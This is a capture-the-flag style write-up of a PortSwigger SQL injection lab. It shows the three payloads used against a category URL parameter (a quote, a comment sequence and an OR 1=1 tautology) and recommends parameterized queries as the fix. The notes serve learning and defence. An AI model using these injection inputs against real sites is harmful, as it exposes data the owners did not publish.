# SQL Injection - PortSwigger Lab 1

## Lab
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
https://portswigger.net/web-security/sql-injection

## Vulnerability
Category filter parameter was directly inserted into SQL query without sanitization:
?category=Lifestyle

## Steps

1. Confirmed injection point by breaking query syntax:
   ?category=Lifestyle'
   Result: Internal Server Error (confirms SQLi)

2. Commented out rest of query to bypass released=1 filter:
   ?category=Lifestyle'--
   Result: Revealed one hidden product (Eco Boat) not shown in normal filter

3. Used OR 1=1 to bypass WHERE clause entirely and return all products:
   ?category=Lifestyle' OR 1=1--
   Result: Lab marked as Solved

## Key Takeaway
User input inserted directly into SQL queries without parameterization allows
attackers to alter query logic. Fix: use parameterized queries / prepared
statements instead of string concatenation.

